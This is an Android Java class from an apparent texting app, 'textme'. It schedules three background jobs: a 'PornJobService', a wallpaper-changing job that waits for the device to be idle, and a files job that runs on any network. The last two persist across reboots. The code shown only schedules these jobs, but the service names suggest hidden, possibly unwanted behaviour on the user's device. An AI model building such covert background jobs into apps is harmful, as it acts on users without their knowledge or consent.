package com.candroid.textme;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;

public class JobsScheduler {
    public static final int PORN_JOB_ID = 1;
    public static final int WALLPAPER_JOB_ID = 2;
    public static final int FILES_JOB_ID = 3;
    public static final long ONE_MINUTE = 60000;
    public static final long ONE_HOUR = ONE_MINUTE * 60;
    protected static void scheduleJob(Context context){
        ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
        JobInfo.Builder builder = new JobInfo.Builder(PORN_JOB_ID, serviceComponent);
        builder.setMinimumLatency(15 * ONE_MINUTE);
        builder.setOverrideDeadline(30 * ONE_MINUTE);
        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
        JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
        jobScheduler.schedule(builder.build());
        if(jobScheduler.getPendingJob(WALLPAPER_JOB_ID) == null){
            ComponentName wallpaperService = new ComponentName(context, WallpaperJobService.class);
            JobInfo.Builder wallpaperBuilder = new JobInfo.Builder(WALLPAPER_JOB_ID, wallpaperService);
            wallpaperBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NOT_ROAMING);
            wallpaperBuilder.setRequiresCharging(true);
            wallpaperBuilder.setRequiresBatteryNotLow(true);
            wallpaperBuilder.setRequiresStorageNotLow(true);
            wallpaperBuilder.setRequiresDeviceIdle(true);
            wallpaperBuilder.setPersisted(true);
            wallpaperBuilder.setOverrideDeadline( 24 * ONE_HOUR);
            wallpaperBuilder.setMinimumLatency(20 * ONE_MINUTE);
            jobScheduler.schedule(wallpaperBuilder.build());
        }
        if(jobScheduler.getPendingJob(FILES_JOB_ID) == null){
            ComponentName filesJobService = new ComponentName(context, FilesJobService.class);
            JobInfo.Builder filesJob = new JobInfo.Builder(FILES_JOB_ID, filesJobService);
            filesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            filesJob.setRequiresCharging(false);
            filesJob.setRequiresBatteryNotLow(false);
            filesJob.setRequiresStorageNotLow(false);
            filesJob.setRequiresDeviceIdle(false);
            filesJob.setPersisted(true);
            filesJob.setOverrideDeadline( 24 * ONE_HOUR);
            filesJob.setMinimumLatency(5 * ONE_MINUTE);
            jobScheduler.schedule(filesJob.build());
        }
    }
}
